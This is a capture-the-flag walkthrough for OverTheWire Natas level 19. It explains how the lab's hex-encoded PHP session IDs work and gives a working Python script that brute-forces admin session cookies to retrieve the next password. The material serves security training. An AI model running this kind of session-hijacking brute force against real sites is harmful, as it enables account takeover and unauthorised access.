> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas19.natas.labs.overthewire.org`                  |
| Username | `natas19`                                                    |
| Password | *found in [Natas Level 17 → 18](natas-level-17-level-18.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **Python** — to brute force encoded session IDs

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas19.natas.labs.overthewire.org` and log in with the password from Level 18.

The page says: **"This page uses mostly the same code as the previous level, but session IDs are no longer sequential."** Same login form, same behaviour. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

The structure is identical to Level 18. The two functions that changed are `createID()` and `isValidID()`.

```php
<?php
$maxid = 640;

function myhex2bin($h) {
    // decodes a hex string back to raw bytes
    if (!is_string($h)) return null;
    $r='';
    for ($a=0; $a<strlen($h); $a+=2) { $r.=chr(hexdec($h[$a].$h[($a+1)])); }
    return $r;
}

function isValidID($id) {
    if($id != strtolower($id)) { return false; }  // must be lowercase hex
    $decoded = myhex2bin($id);                     // hex-decode the cookie value
    // decoded string must match the pattern "<number>-<username>"
    if(preg_match('/^(?P<id>\d+)-(?P<name>\w+)$/', $decoded, $matches)) {
        return true;
    }
    return false;
}

function createID($user) {
    global $maxid;
    $idnum = rand(1, $maxid);       // still a random integer 1–640
    $idstr = "$idnum-$user";        // concatenate: "120-admin"
    return bin2hex($idstr);         // hex-encode: "3132302d61646d696e"
}
?>
```

The session ID is no longer a bare integer — it is `bin2hex("<number>-<username>")`. For example, if the random number is `120` and the username is `admin`, the session ID stored in the cookie is `bin2hex("120-admin")` = `"3132302d61646d696e"`.

The space of possible admin session IDs is still 1–640. The encoding adds no entropy. The brute force is identical to Level 18 — just encode each candidate before sending it.

---

### Understand the Encoding

```
idnum = 120
idstr = "120-admin"
PHPSESSID = bin2hex("120-admin") = "3132302d61646d696e"
```

`bin2hex()` converts each character to its two-digit hex representation:

```
'1' → 31
'2' → 32
'0' → 30
'-' → 2d
'a' → 61
'd' → 64
'm' → 6d
'i' → 69
'n' → 6e
```

In Python: `"120-admin".encode().hex()` produces the same result.

To brute force, iterate `n` from 1 to 640, build `f"{n}-admin"`, hex-encode it, and send it as `PHPSESSID`.

---

### Step 3 — Automate the Brute Force

```python
import requests
from requests.auth import HTTPBasicAuth

url  = "http://natas19.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas19", "<password>")

for n in range(1, 641):  # same ID space as Level 18: 1 to 640
    # build the plaintext session ID and hex-encode it, matching createID()'s format
    session_id = f"{n}-admin".encode().hex()
    cookies    = {"PHPSESSID": session_id}

    r = requests.get(url, auth=auth, cookies=cookies)

    if "You are an admin" in r.text:  # admin session found
        print(f"Admin session ID: {n} → {session_id}")
        for line in r.text.splitlines():
            if "Password" in line:
                print(line.strip())
        break

    print(f"[{n:03d}] {session_id} — not admin")
```

```bash
python3 natas19.py
```

Output (abbreviated):

```
[001] 312d61646d696e — not admin
[002] 322d61646d696e — not admin
...
Admin session ID: <num> → <id>
Password: <password>
```

That is the password for [Natas Level 19 → 20](natas-level-19-level-20.md).

---

## Key Takeaways

- **Encoding is not encryption.** `bin2hex()` is fully reversible with no key. Wrapping a predictable value in hex does not add any secrecy or entropy — it just obscures the format from casual inspection.
- **The ID space is still 1–640.** The switch from bare integers to encoded strings changes the cookie's appearance but not the number of possible values. Any brute force that worked in Level 18 works here with one extra encoding step.
- **The username is part of the session ID.** The format is `"<number>-<username>"`, so you must know (or guess) the username to generate valid candidates. Here the target is `admin` — the only username that would have the admin flag set.

---
